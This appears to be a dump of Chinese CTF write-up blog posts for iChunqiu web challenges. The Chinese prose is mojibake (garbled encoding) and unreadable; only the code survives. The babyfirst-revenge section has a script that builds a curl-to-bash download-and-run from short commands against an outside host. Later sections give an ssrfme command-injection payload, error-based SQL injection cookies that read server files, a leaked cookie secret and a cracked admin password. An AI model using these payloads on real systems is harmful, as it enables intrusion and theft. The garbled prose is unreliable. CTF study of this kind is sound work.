éï¼Œéƒ½æ²¡å‘ç°è„šæœ¬æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œçœ‹äº†ä¸€ä¸‹wpï¼Œç›´æ¥å¤åˆ¶åˆ«äººçš„è„šæœ¬ä¹Ÿæ²¡è·‘å‡ºæ¥ï¼Œä¸çŸ¥é“æ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜ webâ€”â€”ç²—å¿ƒçš„å°æçœ‹åˆ°æ ‡é¢˜ï¼Œgitæ³„éœ²æ‰«æä¸€ä¸‹ æ‰«åˆ°ä¸€ä¸ªindex.htmlæ‰“å¼€å°±æœ‰flagäº† 1n1book{git_looks_s0_easyfun} webâ€”â€”babyfirst-revenge12345678910&lt;?php $sandbox = '/www/sandbox/' . md5(&quot;orange&quot; . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf ' . $sandbox); } highlight_file(__FILE__); å¾—åˆ°ä»¥ä¸Šä»£ç ï¼Œå¼€å¤´å¾ˆç†Ÿæ‚‰ï¼Œä¹‹å‰ä¹Ÿæœ‰åšè¿‡ç±»ä¼¼çš„ï¼Œè¿™é‡Œç›´æ¥æ¬è¿ä¸€ä¸‹: 12345&lt;?php$sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; .&quot;175.43.121.213&quot;);print($sandbox);?&gt;//curl httpbin.org/ip#sandbox/abb91d64b309e1928c7725fcefde973b å®¡è®¡ä¸€ä¸‹ä»£ç :getä¸€ä¸ªcmdï¼Œå¹¶ä¸”å…¶é•¿åº¦è¦å°äº5ï¼Œå¦‚æœå°äº5å°±ä¼šæ‰§è¡Œè¯¥å‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ„é€ ä¸€ä¸ªé•¿åº¦å°äº5çš„å‘½ä»¤å»æ‰§è¡Œ:è¿™é‡Œå‚è€ƒä¸€ç¯‡æ–‡ç« https://blog.csdn.net/hunanchenxingyu/article/details/45047813linuxå¯ä»¥æ˜¯ç”¨åæ–œæ å®ç°å‚æ•°æ¢è¡Œï¼Œè¡¨ç¤ºä¸‹ä¸€è¡Œæ˜¯å½“å‰è¡Œçš„ç»­è¡Œã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥é¢˜ç›®ä¸­ä¸€ä¸ªç‰‡æ®µä¸€ä¸ªç‰‡æ®µçš„è¾“å…¥å—ï¼Ÿæ˜¾ç„¶æ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°†è¾“å…¥çš„å‘½ä»¤å­˜å‚¨åœ¨æ–‡ä»¶ä¸­ï¼Œç„¶åæ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™å³å¯æ‰§è¡Œæˆ‘ä»¬çš„æŒ‡ä»¤äº†ã€‚ä½†æ˜¯å°½ç®¡æˆ‘ä»¬è¾“å…¥lsï¼Œç”»é¢ä¾æ—§æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦è€ƒè™‘åå¼¹shellæˆ–è€…å†™é©¬è¿™é‡Œç›´æ¥ç”©è„šæœ¬å§ï¼šæ’ä¸€å¥é¢˜å¤–è¯ï¼šåœ¨åšiæ˜¥ç§‹é¢˜ç›®çš„æ—¶å€™ æ€»æœ‰ç§é¢˜ç›®æœ‰å¹´ä»£çš„æ„Ÿè§‰ï¼Œè¯¢é—®å®Œè€å¸ˆåå‘ç°ç¡®å®å¦‚æ­¤ï¼Œæ‰€ä»¥æƒ³èµ¶ç´§å»buu æˆ–è€…æ”»é˜²ä¸–ç•Œåˆ·ç‚¹æ–°é¢˜ï¼Œä½†æ˜¯æƒ³äº†ä¸€ä¸‹è¿˜æ˜¯è€ç€æ€§å­å…ˆæŠŠè¿™é¢˜åšå®Œå§ï¼æ€è·¯ï¼š1.ç»•è¿‡é•¿é™åˆ¶æ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼Œéœ€è¦å°†å‘½ä»¤æ”¾åˆ°æ–‡ä»¶ä¸­æ‰§è¡Œ2.å¦‚ä½•å°†å‘½ä»¤æ”¾åˆ°æ–‡ä»¶ä¸­æ‰§è¡Œå‘¢ï¼Ÿ3.ä½¿ç”¨è¾“å‡ºé‡å®šå‘ç¬¦å·4.é€šè¿‡åœ¨ç›®å½•ä¸‹å»ºç«‹å¤šä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨lså°†æ‰€æœ‰æ–‡ä»¶åé‡å®šå‘è‡³æ–°æ–‡ä»¶ä¸­ï¼Œå¯¹æ–‡ä»¶ä½¿ç”¨è¯»å–å‘½ä»¤å³å¯ ç”±äºæœ¬é¢˜æ— æ³•è¾“å‡ºå†…å®¹æ‰€ä»¥æˆ‘ä»¬åªèƒ½æ ¹æ®åå¼¹shellæˆ–è€…å†™é©¬æ¥åšï¼šè¿™é‡Œæ˜¯è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940import requestsfrom time import sleepurl = 'http://192.168.248.132:8083/index.php?cmd=%s'def main(): re = requests.get('http://192.168.248.132:8083/index.php?reset=1') payload = [ '&gt;-t\\\\', '&gt;\\&gt;A', '&gt;l\\\\', '&gt;s\\ \\\\', 'ls&gt;B', 'ls&gt;&gt;B', '&gt;ash', '&gt;\\|b\\\\', '&gt;2\\\\', '&gt;1:8\\\\', '&gt;8.\\\\', '&gt;24\\\\', '&gt;68.\\\\', '&gt;2.1\\\\', '&gt;19\\\\', '&gt;l\\ \\\\', '&gt;cur\\\\', 'sh%20B', 'sh%20A'] for each in payload: re = requests.get(url % each) if(re.status_code != 200): print 'Something error!' return 0 sleep(0.1) print 'Have done!'if __name__ == '__main__': main()","link":"/2021/03/07/i%E6%98%A5%E7%A7%8B12/"},{"title":"iæ˜¥ç§‹10","text":"webâ€”â€”Musee de Xè¿™é¢˜æ€ä¹ˆéƒ½æ³¨å†Œä¸äº†ï¼Œsqlæ³¨å…¥ä¹Ÿæ²¡æ•ˆæœï¼Œè¯•äº†ä¸€ä¸‹å¼±å£ä»¤ admin&amp;password é¡µé¢ç›´æ¥æŠ¥é”™ï¼Œæ‰«æä¹Ÿæ²¡æ‰«å‡ºä»€ä¹ˆï¼Œçœ‹äº†ä¸€ä¸‹wpï¼Œè¯´å°±æ˜¯è¦æ³¨å†Œï¼Ÿå¯èƒ½æ˜¯ç¯å¢ƒå´©äº†å§ï¼Œäºæ˜¯å†³å®šçœ‹ä¸€ä¸‹wpå­¦ä¹ æ€è·¯é€›ä¸€ä¸‹ç½‘ç«™â€”â€”å¾—åˆ°æŠ¥é”™ä¿¡æ¯â€”â€”ç¡®å®šæ˜¯sstiæ³¨å…¥â€”â€”fuzzè¿‡æ»¤å†…å®¹â€”â€”æ„é€ æ³¨å…¥è¯­å¥â€”â€”å¯»æ‰¾å¯åˆ©ç”¨å­ç±»â€”â€”cat flagè¿˜æŒºæ— è¯­çš„ webâ€”â€”ssrfme123456789101112&lt;?php $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($sandbox); //åˆ›å»ºç›®å½• @chdir($sandbox); //æ›´æ”¹ç›®å½•ä¸ºé‚£ä¸ª $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); //escapeshellargæŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°ï¼Œå¹¶ä¸”èƒ½è½¬ä¹‰å…¶ä¸­çš„å•å¼•å·ï¼Œshell_exec()è°ƒç”¨GETæ¥æ‰§è¡Œå‘½ä»¤ï¼Œ $info = pathinfo($_GET[&quot;filename&quot;]); //get filename $dir = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); //basename() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚ highlight_file(__FILE__); é¦–å…ˆæˆ‘ä»¬éœ€è¦å¼„æ¸…æ¥šREMOTE_ADDRâ€è¿™ä¸ªå’ŒæœåŠ¡å™¨å»ºç«‹tcpæ¡æ‰‹çš„ipç©¶ç«Ÿæ˜¯å¤šå°‘ï¼Œåœ¨æŸ¥æ‰¾äº†è®¸å¤šæŒ‡ä»¤åï¼Œç»ˆäºï¼šåœ¨cmdçª—å£è¾“å…¥curl httpbin.org/ipï¼Œç„¶åå¾—åˆ°çš„IPä»£å…¥ä¸€ä¸‹ä»£ç ä¸­ 12345&lt;?php$sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; .&quot;175.43.121.213&quot;);print($sandbox);?&gt;#sandbox/abb91d64b309e1928c7725fcefde973b ä»£ç è§£æéƒ½åœ¨ä¸Šé¢äº†ï¼Œä½†æ˜¯æ€è·¯è¿˜ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œäºæ˜¯ä¹å»çœ‹äº†ä¸€ä¸‹wpã€‚é¦–å…ˆéœ€è¦çŸ¥é“ä¸€ä¸ªçŸ¥è¯†ç‚¹perlæ–‡ä»¶å¯ä»¥æ‰§è¡Œå‘½ä»¤https://news.ycombinator.com/item?id=3943116 12$userinput = &quot;cat /etc/passwd |zenity --text-info |&quot;;open(file_handler, &quot;$userinput&quot;); å¯ä»¥å‘ç°openå‡½æ•°æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ è€ŒGETå‡½æ•°åº•å±‚å°±æ˜¯è°ƒç”¨äº†openå¤„ç† 1234file.pm84: opendir(D, $path) or132: open(F, $path) or return new#è¿™é‡Œçš„openä¸­çš„pathæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥å¯ä»¥æŠŠæ–‡ä»¶åæ‹¼æ¥å…¥å‘½ä»¤å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚ openå‡½æ•°æœ¬èº«è¿˜æ”¯æŒfileåè®® 123456789101112131415161718...=head2 File RequestThe library supports GET and HEAD methods for file requests. The&quot;If-Modified-Since&quot; header is supported. All other headers areignored. The I&lt;host&gt; component of the file URL must be empty or setto &quot;localhost&quot;. Any other I&lt;host&gt; value will be treated as an error.Directories are always converted to an HTML document. For normalfiles, the &quot;Content-Type&quot; and &quot;Content-Encoding&quot; in the response areguessed based on the file suffix.Example: $req = HTTP::Request-&gt;new(GET =&gt; 'file:/etc/passwd');... æˆ‘ä»¬å‰é¢è¯´è¿‡GETæ”¯æŒfileåè®®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç‚¹æ¥å¯»æ‰¾flagæ–‡ä»¶ï¼šGET file:///è¿™æ ·æ˜¯è®¿é—®æ ¹ç›®å½•ï¼š 1?url=file:///&amp;filename=1.txt æ¥ä¸‹æ¥è¯¥å¦‚ä½•è¯»å–å‘¢ï¼Ÿç›´æ¥ä½¿ç”¨file://è¯»å–è¯•è¯•ï¼š 1?url=file:///readflag&amp;filename=5.txt å‘ç°æ˜¯ELFæ–‡ä»¶ï¼Œå¯æ‰§è¡Œçš„ï¼Œé‚£ä¹ˆåœ¨è¿™é‡Œä¸ºä»€ä¹ˆæ²¡æœ‰å‡ºæ‰§è¡Œç»“æœå‘¢ï¼ŸåŸå› æ˜¯ï¼Œç›´æ¥/readflagçš„è¯æ˜¯å°†å…¶æºç ä¼ å…¥ï¼Œè€Œä¸æ˜¯å°†æ‰§è¡Œç»“æœä¼ å…¥,è€Œè¿™é‡ŒçŒœæµ‹æ˜¯éœ€è¦flagæ˜¯éœ€è¦æ‰§è¡Œåæ‰èƒ½å‡ºæ¥çš„è¿™é‡Œè¿˜éœ€è¦äº†è§£ä¸€ç‚¹ï¼šGET æ‰§è¡Œå‘½ä»¤å‰å¿…é¡»è¦æœ‰ä»¥å‘½ä»¤ä¸ºæ–‡ä»¶åçš„æ–‡ä»¶å­˜åœ¨æ‰€ä»¥æœ€ç»ˆæ€è·¯æ˜¯ï¼šåˆ›å»ºä¸€ä¸ªä»¥å‘½ä»¤å‘½åçš„æ–‡ä»¶ï¼Œåœ¨æ‰§è¡Œè¯¥å‘½ä»¤å°†å…¶ç»“æœä¼ å…¥æ–°æ–‡ä»¶ä¸­ è€Œä¹‹å‰çš„ä½¿ç”¨fileåè®®åŠ ä¸ª/åªæ˜¯è®¿é—®æ ¹ç›®å½•çŸ¥é“è¿™ç‚¹åï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ„é€ è¯­å¥ï¼š 12?url=?filename=|/readflag?url=file:|/readflag&amp;filename=111 æ¥ä¸‹æ¥è®¿é—®111å³å¯æ‹¿åˆ°flag 1flag{d9faf0e7-6152-48be-8c5c-479c9681bcf3} å°ç»“ï¼šæ¢³ç†ä¸€ä¸‹å§ï¼Œæ„Ÿè§‰åšçš„æŒºæ¨¡ç³Šçš„ï¼šåˆ†ææºç ï¼Œå‘ç°æœ‰shellå‡½æ•°æ‰§è¡Œå‘½ä»¤â€”â€”ä½¿ç”¨GETå‡½æ•°æ‰§è¡Œå‘½ä»¤â€”â€”GETæŒ‡ä»¤ç‰¹æ€§ï¼šopen()å‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤â€”â€”æ„é€ payloadâ€”â€”è·å¾—flagã€‚ è¡¥å……ï¼šæœç„¶æ”¾ç€ä¸ç®¡æ€»æœ‰ç‚¹ç–™ç˜©äºæ˜¯å†å»æŸ¥æ‰¾äº†ä¸€ä¸‹èµ„æ–™ï¼š 12345678910111213141516...# URL OK, look at filemy $path = $url-&gt;file;# test file exists and is readableunless (-e $path) {return HTTP::Response-&gt;new( &amp;HTTP::Status::RC_NOT_FOUND, &quot;File `$path' does not exist&quot;);}...# read the fileif ($method ne &quot;HEAD&quot;) {open(F, $path) or return new HTTP::Response(&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR, &quot;Cannot read file '$path': $!&quot;); 1.æˆ‘ä»¬è¾“å…¥çš„å†…å®¹æ˜¯ç”±getæ‰§è¡Œçš„ï¼Œgetæ‰§è¡Œçš„æ˜¯pathï¼Œå¦‚æœpathæœ¬èº«æ˜¯å‘½ä»¤ï¼Œå°±ä¼šç›´æ¥æ‰§è¡Œã€‚2.getæ‰§è¡Œçš„å¯¹è±¡å…¶å®æ˜¯$path,å½“æˆ‘ä»¬ä¼ å…¥çš„å‘½ä»¤çš„æ—¶å€™ï¼Œæ‰¾ä¸åˆ°è¯¥pathï¼Œå°±ä¼šå‡ºç°$pathâ€™ does not existï¼Œæ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬éœ€è¦å…ˆå»ºç«‹å‡ºåŒå‘½ä»¤çš„æ–‡ä»¶åï¼Œæ›´åˆç†çš„è¯´åº”è¯¥æ˜¯è·¯å¾„ã€‚å¦‚æœæˆ‘çš„ç†è§£æœ‰è¯¯ä¸€å®šæ¥å’Œæˆ‘è®¨è®ºä¸€ä¸‹ï¼Œï¼Œï¼Œ webâ€”â€”XSSå¹³å°çœ‹äº†ä¸€ä¸‹wpï¼Œæ„é€ é”™è¯¯æ•°æ®ï¼Œå¼•å‘æŠ¥é”™å›æ˜¾ï¼Œå¾—åˆ°å…³é”®ä¿¡æ¯rtinyï¼Œå˜æ¸…ä¸€ä¸‹è¿™é‡Œçš„æ€è·¯ï¼šæ ¹æ®é¢˜ç›®ï¼Œè¿™æ˜¯ä¸€ä¸ªxsså¹³å°ï¼Œé™¤æ­¤ä¹‹å¤–æ— æ›´å¤šä¿¡æ¯ï¼Œé‚£ä¹ˆæˆ‘å°±éœ€è¦çŸ¥é“è¿™æ˜¯ä»€ä¹ˆxsså¹³å°ï¼Œå¹¶æ ¹æ®ç‰ˆæœ¬å»å¯»æ‰¾å¯¹åº”çš„æ¼æ´æˆ–è€…æºç ï¼Œé‚£ä¹ˆæ­¤æ—¶è¦æ€ä¹ˆå»å¯»æ‰¾å‘¢ï¼Ÿç¬¬ä¸€ï¼Œçœ‹çœ‹é¡µé¢æœ‰æ²¡æœ‰ä»€ä¹ˆæç¤ºï¼Œç¬¬äºŒï¼Œæ ¹æ®æŠ¥é”™ä¿¡æ¯ï¼Œé‚£ä¹ˆå¦‚ä½•æŠ¥é”™å‘¢?SQLæ³¨å…¥åœ¨è¿™é‡Œæ— æ³•æŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯å†…å®¹æ— æ³•æŠ¥é”™ï¼Œæ‰€ä»¥æ­¤æ—¶å°è¯•ä¸€ä¸‹æ›´æ”¹æ•°æ®ç±»å‹è¾¾åˆ°æŠ¥é”™çš„æ•ˆæœã€‚ ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯ä¸ªå•¥ï¼‰ ä¸Šgithubæœç´¢ä¸€ä¸‹ï¼š åŸæ¥rtinyæ˜¯ä¸€ä¸ªxsså¹³å°ï¼Œåœ¨githubæœ‰ä»–çš„æºç ï¼Œæˆ‘ä»¬æŸ¥çœ‹ç™»å½•æºç çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ”¶è·ï¼š 1234567891011121314151617181920212223242526272829__author__ = 'r0ker'import tornado.webimport dbfrom config import URL, sqlfrom function import md5class LoginHandler(tornado.web.RequestHandler): def get(self): if self.get_secure_cookie(&quot;username&quot;) and self.get_secure_cookie(&quot;password&quot;): self.redirect(&quot;/&quot;) else: self.render(&quot;login.html&quot;, url=URL) def post(self): self.set_header(&quot;Content-Type&quot;, &quot;text/plain&quot;) if True not in [f in self.get_argument(&quot;email&quot;) for f in sql]: row = db.ct( &quot;manager&quot;, &quot;*&quot;, &quot;username='&quot;+self.get_argument(&quot;email&quot;)+&quot;' and password='&quot; + md5(self.get_argument('pass'))+&quot;'&quot;) if row: self.set_secure_cookie(&quot;username&quot;, row['username']) self.set_secure_cookie(&quot;password&quot;, row['password']) self.write(&quot;true&quot;) else: self.write(&quot;false&quot;) else: self.write(&quot;false&quot;) 123456789101112131415161718192021__author__ = 'r0ker'import tornado.webfrom function import md5import dbfrom config import URLclass LockHandler(tornado.web.RequestHandler): def get(self): self.set_secure_cookie(&quot;lock&quot;,'1') self.render(&quot;lock.html&quot;) def post(self): username = self.get_secure_cookie(&quot;username&quot;) or '' passwd = md5(self.get_argument('password', '')) row = db.ct(&quot;manager&quot;, &quot;*&quot;, &quot;username='&quot; + username + &quot;' and password='&quot; + passwd + &quot;'&quot;) if row: self.set_secure_cookie(&quot;lock&quot;, &quot;0&quot;) self.redirect(&quot;http://&quot; + URL) else: self.redirect(&quot;http://&quot; + URL + &quot;/lock&quot;) æœ‰çš„æ—¶å€™æ„Ÿè§‰è¿™äº›ä»£ç å¥½éš¾è¯»ï¼Œäºæ˜¯å°†å…¶å’Œå¯¹åº”çš„ç±»ç§»åˆ°ä¸€èµ·ä¸€çœ‹ï¼š 1234567row = db.ct(&quot;manager&quot;, &quot;*&quot;, &quot;username='&quot; + username + &quot;' and password='&quot; + passwd + &quot;'&quot;)def ct(table, column, where): return db.get(&quot;select &quot;+column+&quot; from &quot;+table+&quot; where &quot;+where)#å˜æˆæ˜¯ select * from manager where username='' and password= ''#åœ¨è¿™é‡Œä½¿ç”¨sqlæ³¨å…¥ï¼š#select * from manager where username=''and.. #''and password= '#æ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬éœ€è¦çŸ¥é“self.get_secure_cookieä¸­çš„cookieæ˜¯å¤šå°‘ï¼Ÿåœ¨index.pyä¸­å‘ç°cookie_secretä¸ºM0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc= æ€è·¯ï¼šæ ¹æ®ä¸Šé¢å¾—åˆ°ä¿¡æ¯ï¼Œå˜æ¸…ä¸€ä¸‹æ€è·¯ï¼š1.æˆ‘ä»¬æ³¨å…¥çš„é¡µé¢æ—¶lockï¼Œå› ä¸ºlocké‡Œé¢å­˜åœ¨SQLæ³¨å…¥ç‚¹2.å®ƒä½¿ç”¨äº†self.get_secure_cookie()å‡½æ•°ï¼Œè§£å¯†è·å¾—usernameï¼Œæ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬è¦åŠ å¯†å‡ºæˆ‘ä»¬æ³¨å…¥è¯­å¥çš„cookieå€¼ï¼Œé€šè¿‡æˆ‘ä»¬å‘ç°çš„cookie_secretï¼Œå¹¶ç»“åˆtornadoæ¡†æ¶ä¸­çš„åŠ å¯†å‡½æ•°åœ¨æœ¬åœ°è·å¾—åŠ å¯†åçš„å†…å®¹3.ç”±äºæŠ¥é”™é¡µé¢åœ¨loginé¡µé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŠ“åŒ…loginé¡µé¢ï¼Œå†æ›´æ”¹ä¸ºåœ°å€æ›´æ”¹ä¸ºlockï¼Œæœ€åæ·»åŠ usernameçš„cookieå€¼ã€‚åŠ å¯†å†…å®¹è„šæœ¬ç¼–å†™ï¼š 1234567891011121314151617181920212223import tornado.webimport tornado.ioloopsettings={ &quot;cookie_secret&quot;:&quot;M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=&quot;}class indexhandler(tornado.web.RequestHandler): def get(self): #self.set_secure_cookie(&quot;username&quot;,&quot;'and extractvalue('~',concat((select group_concat(table_name) from information_schema.tables where table_schema='xss')))#&quot;) #self.set_secure_cookie(&quot;username&quot;,&quot;'and extractvalue('~',concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='manager')))#&quot;) #self.set_secure_cookie(&quot;username&quot;,&quot;'and extractvalue('~',concat(0x7e,(select group_concat(username,password,email) from manager)))#&quot;) self.set_secure_cookie(&quot;username&quot;,&quot;'and extractvalue('~',concat(0x7e,(substr((select load_file('/var/www/html/f13g_ls_here.txt')),1,60))))#&quot;) self.write(self.get_secure_cookie(&quot;username&quot;))if __name__ == &quot;__main__&quot;: app=tornado.web.Application( [ (r&quot;/&quot;,indexhandler), ],**settings#cooki_secret:xxxxçš„ç®€å†™ ) app.listen(8004)#ç«¯å£æ³¨æ„åˆ«å†²çª tornado.ioloop.IOLoop.current().start() 1 æ¥ä¸‹æ¥å°±æ˜¯ç»„åˆåˆ¸ï¼Œå…¶å®çªç„¶æƒ³èµ·æ¥ï¼Œæˆ‘ä»¬çš„ç”¨æˆ·åå¯†ç å°±æ˜¯åœ¨managerå½“ä¸­ï¼Œå› ä¸ºåœ¨çœ‹æºç çš„æ—¶å€™é‚£ä¸ªè¯­å¥æ˜¯select * from manager wherexxxx ç™»å½•ä»¥åï¼š è¿™é‡Œæœ‰ä¸ªå°å‘ï¼Œå½“æˆ‘åœ¨æŸ¥è¯¢å­—æ®µåçš„æ—¶å€™ï¼Œæ˜¯è¿™æ ·çš„ï¼š å³å†…å®¹æ˜¯æ²¡æœ‰æ˜¾ç¤ºå®Œæ•´çš„ï¼Œå¤§æ¦‚æ˜¯é•¿åº¦è¢«é™åˆ¶äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç”¨substræˆªå–ä¸€ä¸‹ï¼Œåæ¥æ‰å‘ç°ï¼Œå“æˆ‘æ˜¯å¿˜è®°æ ¼å¼äº†ï¼Œæˆ‘ä»¬è¯´extractvalueæŠ¥é”™æ³¨å…¥ï¼ŒæŠ¥é”™å†…å®¹åœ¨é—®é¢˜å­—ç¬¦ä¹‹åï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æˆ‘ä»¬çš„æŸ¥è¯¢è¯­å¥ä¹‹å‰è¦åŠ ä¸Š~,è¿™ä¸€æ¬¡æˆ‘æ¯”è¾ƒæ‡’ï¼Œåœ¨å‰é¢ä¸€æ¡æ³¨å…¥çš„æ—¶å€™æ²¡åŠ ä¹Ÿå¯ä»¥ï¼Œäºæ˜¯åé¢ä¹Ÿæ²¡åŠ äº†ï¼ŒåŸæ¥æ˜¯ä¸è¡Œçš„ï¼Œå‰é¢ä¸€æ¡å¯ä»¥æ˜¯å› ä¸ºæ˜¯database()ï¼Œå¯èƒ½å‰é¢å°±æ˜¯æŸä¸ªç‰¹æ®Šå­—ç¬¦äº†ï¼Œè€Œæˆ‘å…¶å®ä¹Ÿä¸çŸ¥é“æ•°æ®åº“çœŸå®æ˜¯å•¥æ ·çš„ï¼Œå°±ä»¥ä¸ºé‚£ä¸ªæ˜¯æ­£ç¡®çš„ï¼çŠ¯å¤§é”™äº†ï¼ï¼ å¾ˆæ˜æ˜¾è¿™é‡Œæ˜¯æ²¡æˆªå…¨çš„ï¼Œè¿™ä¸ªæ—¶å€™æœ‰ä¸¤ç§åŠæ³•ï¼Œä¸€ç§å°±æ˜¯åªæ˜¾ç¤ºpasswordå³å¯ï¼Œå¦ä¸€ç§æ˜¯ç”¨substræˆ–è€…midæˆªå–ï¼Œè¿™é‡Œä¸ºå•¥æˆ‘çŸ¥é“æ²¡æˆªå…¨ï¼Œå› ä¸ºæˆ‘å‰é¢æ˜¯åªæŸ¥è¯¢äº†passwordï¼Œå‡ºæ¥çš„æ˜¯åé¢çš„ä¸€åŠï¼Œè¿™é‡Œå…¶å®å¯ä»¥åšä¸ªå°æ ‡è®° åœ¨æŸ¥è¯¢çš„username password emailä¸­é—´åŠ ä¸ªåˆ†éš”ç¬¦ä½œä¸ºæ ‡è®° å¯†ç éœ€è¦MD5è§£å¯†ï¼Œè¿™é‡Œç›´æ¥æ‹¿åˆ«äººçš„äº†ï¼š ichuqiu|318a61264482e503090facfc4337207f|545 MD5è§£å¯†å¾—å¯†ç Myxss623 é¢ï¼Œæˆ‘çœ‹æˆå¯†ç æ˜¯ichunqiuè¯•äº†å¥½å‡ æ¬¡ï¼Œæ²¡æƒ³åˆ°æ˜¯ichuqiu==è¿˜æŒºæ— è¯­çš„ã€‚ã€‚ã€‚ flagåœ¨è¿™é‡Œï¼Œæ¥ä¸‹æ¥å°±æ˜¯å°†å®ƒæ‰“å¼€ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨select load_file(â€˜â€™) å¾ˆæ˜æ˜¾æ²¡æˆªå®Œï¼Œæ‰€ä»¥ä½¿ç”¨substræˆªä¸€ä¸‹ flag{e13482d8-ccee-47fb-8a43-2a03eb9d70c5} åŠ å¼ºè®°å¿†è¿™é‡Œæœ‰ä¸ªéœ€è¦åŠ å¼ºè®°å¿†çš„ç‚¹å°±æ˜¯ è¿™ä¸ªselect load_file(â€˜â€™) ä½¿ç”¨sqlè¯­å¥æŸ¥çœ‹æ–‡ä»¶çš„æ–¹æ³•1ã€å¿…é¡»æœ‰æƒé™è¯»å–å¹¶ä¸”æ–‡ä»¶å¿…é¡»å®Œå…¨å¯è¯»ã€‚ 1ã€éœ€è¦æœ‰æƒé™2ã€æ¬²è¯»å–æ–‡ä»¶å¿…é¡»åœ¨æœåŠ¡å™¨ä¸Š3ã€å¿…é¡»æŒ‡å®šæ–‡ä»¶å®Œæ•´çš„è·¯å¾„4ã€æ¬²è¯»å–æ–‡ä»¶å¿…é¡»å°äºmax_allowed_packet https://www.cnblogs.com/blacksunny/p/8060028.html","link":"/2021/03/02/i%E6%98%A5%E7%A7%8B10/"},{"title":"iæ˜¥ç§‹9","text":"webâ€”â€”lookæ£€æŸ¥å®Œæºç ï¼Œæ‰«æå®Œåå°æ²¡æœ‰æ”¶è·åï¼ŒæŠ“åŒ…çœ‹è¿”å›ï¼Œçœ‹åˆ°ä¸€ä¸ª å¯ç–‘å†…å®¹X-HT: verify,æ¨æµ‹æ˜¯sqlæ³¨å…¥çš„å˜é‡åœ¨æ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œé™åˆ¶äº†é•¿åº¦ï¼Œåªèƒ½4ä¸ªå­—ç¬¦ï¼Œç™¾åº¦ä»¥åå‘ç°å¯ä»¥ä½¿ç”¨â€˜/1%23ã€â€™*1%23ã€â€™=0%23ã€â€™%1%23 è¿™é‡Œè¯´ä¸€ä¸‹è‡ªå·±çš„ç†è§£ï¼ŒæŸ¥è¯¢è¯­å¥åº”è¯¥æ˜¯æ˜¯select * from xxx where xxx =ï¼Œè®°å¾—ä¹‹å‰çš„-0-å’Œ-1-ï¼Œå½“ä¸º-0-çš„æ—¶å€™æ˜¯å¯ä»¥æŸ¥è¯¢åˆ°ç»“æœçš„ï¼Œè€Œä»¥ä¸Šè¿™äº›è¿ç®—çš„ç»“æœéƒ½ä¸º0ï¼Œæ‰€ä»¥å¯ä»¥æˆåŠŸç»•è¿‡ å¾—åˆ°ä¸‹ä¸€æ¡çº¿ç´¢ï¼š ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºåˆæ˜¯sqlæ³¨å…¥ï¼Œå‘ç°ä¸æ˜¯ çœ‹äº†sqlæ³¨å…¥åå‘ç°æ˜¯ åœ¨vimä¸­æ“ä½œçš„è¡Œä¸ºï¼Œvimä¼šè‡ªåŠ¨è®°å½•ä¸‹æ¥ï¼Œä¿å­˜åœ¨~/.viminfoæ–‡ä»¶ä¸­æ‰€ä»¥è®©æˆ‘ä»¬æ‰“å¼€çœ‹çœ‹ 1234567891011121314151617181920212223&lt;?php$con = mysql_connect('localhost','root','');mysql_query(&quot;set names utf8&quot;);mysql_select_db(&quot;ctf&quot;);if($_SERVER[&quot;REMOTE_ADDR&quot;]=='8.8.8.8'){ $name = addslashes($_GET['usern3me']);}else{ if(stripos($_GET['usern3me'],'Bctf2O16')!==false){ $name = 'FUCK'; } else{ $name = addslashes($_GET['usern3me']); }}echo 'hello '.$name;$sql = &quot;select * from admin where name='$name'&quot;;$result = mysql_query($sql);$num = mysql_num_rows($result);if($num&gt;0){ echo '&lt;br&gt;next ***.php';}?&gt; 